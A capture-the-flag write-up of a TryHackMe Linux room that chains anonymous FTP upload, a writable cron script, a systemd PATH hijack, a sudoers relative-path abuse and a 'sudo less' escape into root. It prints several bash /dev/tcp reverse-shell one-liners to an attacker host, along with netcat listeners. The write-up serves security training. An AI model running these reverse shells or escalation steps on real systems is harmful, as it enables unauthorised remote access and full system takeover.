# Jump - Write-Up

**Platform:** TryHackMe
**Category:** Linux Lateral Movement, Automation Pipeline Abuse, Privilege Escalation
**Author:** GenericLamp

---

## Summary

Jump simulates a misconfigured internal automation pipeline running on a Linux server. Each stage of the pipeline trusts the previous one too much, allowing an attacker to move laterally from anonymous FTP access all the way to root through five separate users: `recon_user -> dev_user -> monitor_user -> ops_user -> root`. The chain combines a classic file-drop RCE, a group-membership misconfiguration, a relative-path abuse in a writable cron script, a PATH hijack against a systemd service, a sudoers relative-path abuse, and a textbook GTFOBins shell escape.

---

## Recon

```bash
nmap -sC -sV -p- -T4 <target-ip>
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
```

FTP allows anonymous login:

```
ftp <target-ip>
Name: anonymous
230 Login successful.
```

Directory listing shows a world-writable `incoming/` folder and a `pub/` folder. `pub/README.txt` reveals the automation:

```
[ recon pipeline ]
All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

---

## anonymous -> recon_user

Files dropped into `incoming/` get picked up and executed automatically. A reverse shell payload works without needing execute permissions on the uploaded file itself (the pipeline invokes it through an interpreter rather than direct exec):

```bash
cat > test.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/5555 0>&1
EOF
```

```bash
nc -lvnp 5555
```

```
ftp <target-ip>
cd incoming
put test.sh
```

Shell lands as `recon_user`:

```
recon_user@tryhackme-2404:~$ whoami
recon_user
recon_user@tryhackme-2404:~$ ls
flag.txt  shell.sh
recon_user@tryhackme-2404:~$ cat flag.txt
[REDACTED]
```

Flag: `[REDACTED]`

Side note: `~/shell.sh` already contained a hardcoded reverse-shell one-liner to an unrelated IP — most likely a leftover build artifact from the room, not an active trigger.

---

## recon_user -> dev_user

`id` reveals a group misconfiguration: `recon_user` is also a member of the `dev_user` and `devops` groups.

```
recon_user@tryhackme-2404:~$ id
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

Because of this, `/home/dev_user/flag.txt` (`-rw-rw-r--`) is readable directly, even though the home directory itself is `750`:

```
recon_user@tryhackme-2404:/home$ cd dev_user
recon_user@tryhackme-2404:/home/dev_user$ cat flag.txt
[REDACTED]
```

Flag: `[REDACTED]`

This shortcut only grants read access, not a real `dev_user` session or the ability to `chmod` files owned by `dev_user` — both needed for the next stage, so the intended path was still required.

### Getting a real dev_user shell

`/opt/dev/backup.sh` is owned by `dev_user` but group-writable, and `recon_user`'s group membership covers it:

```bash
nc -lvnp 5556
echo 'bash -i >& /dev/tcp/<attacker-ip>/5556 0>&1' >> /opt/dev/backup.sh
```

The exact trigger (cron/timer) wasn't conclusively identified — no matching entry in `crontab -l`, `/etc/cron.d/`, or `systemctl list-timers` — but the payload fired automatically shortly after.

```
dev_user@tryhackme-2404:~$ id
uid=1002(dev_user) gid=1002(dev_user) groups=1002(dev_user),1005(devops)
```

---

## dev_user -> monitor_user

`systemctl list-units --type=service | grep -i health` surfaces `healthcheck.service`:

```
systemctl cat healthcheck.service
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

`/usr/local/bin/healthcheck` calls `ps aux` without a full path:

```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

Because `/opt/dev/bin` comes first in the service's `PATH`, dropping a file named `ps` there hijacks the lookup for a process running as `monitor_user`. `/opt/dev/bin/ps` already existed but was owned by `dev_user` and not executable — `chmod` requires file ownership (or root), so group write access alone wasn't enough, confirming the need for the real `dev_user` shell obtained above.

```bash
cat > /opt/dev/bin/ps << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/5557 0>&1
EOF
chmod +x /opt/dev/bin/ps
```

Listener on 5557, wait for `healthcheck.timer`:

```
monitor_user@tryhackme-2404:/$ id
uid=1003(monitor_user) gid=1003(monitor_user) groups=1003(monitor_user)
monitor_user@tryhackme-2404:/$ cat /home/monitor_user/flag.txt
[REDACTED]
```

Flag: `[REDACTED]`

---

## monitor_user -> ops_user

```
monitor_user@tryhackme-2404:/$ sudo -l
User monitor_user may run the following commands:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

```bash
cat /usr/local/bin/deploy.sh
```
```
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

`deploy.sh` calls `deploy_helper.sh` via a relative path, and `deploy_helper.sh` is owned by `monitor_user` — the current user — making it writable:

```bash
cat > /opt/app/deploy_helper.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/5558 0>&1
EOF
```

Execute bit was already set (owner `monitor_user`, no `chmod` needed).

```bash
nc -lvnp 5558
sudo -u ops_user /usr/local/bin/deploy.sh
```

Note: `sudo -l` output uses the `(ops_user)` prefix, meaning the rule only matches `sudo -u ops_user <cmd>` — plain `sudo <cmd>` tries to run as root, doesn't match the rule, and prompts for a password that doesn't exist.

```
ops_user@tryhackme-2404:/opt/app$ id
uid=1004(ops_user) gid=1004(ops_user) groups=1004(ops_user)
ops_user@tryhackme-2404:/opt/app$ cat /home/ops_user/flag.txt
[REDACTED]
```

Flag: `[REDACTED]`

---

## ops_user -> root

```
ops_user@tryhackme-2404:/opt/app$ sudo -l
User ops_user may run the following commands:
    (root) NOPASSWD: /usr/bin/less
```

Classic GTFOBins shell escape: `sudo` grants the process root privileges, which are inherited by any child process it spawns — including `less`'s built-in shell-escape feature (`!<command>`). The file passed to `less` is irrelevant; it's just something for the pager to open.

```bash
sudo /usr/bin/less /etc/hosts
```

Inside the pager:

```
!/bin/bash
```

```
root@tryhackme-2404:/opt/app# id
uid=0(root)
root@tryhackme-2404:/opt/app# cat /root/flag.txt
[REDACTED]
```

Flag: `[REDACTED]`

(Root's home is `/root`, not `/home/root`.)

---

## Flags

| # | User | Vulnerability |
|---|------|----------------|
| 1 | recon_user | Anonymous FTP + auto-processed upload folder -> RCE |
| 2 | dev_user | Group misconfiguration (shortcut) / writable backup.sh -> reverse shell (intended path) |
| 3 | monitor_user | PATH hijack via systemd `Environment=PATH=...` |
| 4 | ops_user | Sudoers relative-path abuse (writable helper script) |
| 5 | root | GTFOBins - `sudo less` shell escape |

---

## Lessons Learned

- Anonymous FTP combined with a world-writable "processing" folder is a classic RCE entry point, regardless of whether the pipeline executes uploads via an interpreter or direct exec.
- Always check group memberships with `id`, not just file/directory permissions - they can reveal misconfigured access.
- Group write access to a file doesn't grant the right to change its permissions; `chmod` requires ownership (or root).
- `sudo -l` entries with a `(user)` prefix only match `sudo -u <user> <cmd>` - running plain `sudo <cmd>` targets root and fails.
- Relative path calls inside privileged scripts (`./helper.sh` instead of an absolute path), combined with wrong ownership on the called file, chain into privilege escalation.
- Custom `Environment=PATH=...` directives in systemd units are worth checking whenever a service invokes a binary (e.g. `ps`) without a full path.
- GTFOBins: any sudo-permitted binary with a built-in shell escape (`less`, `vim`, `man`, ...) yields a root shell via `!<cmd>` or the equivalent internal escape.
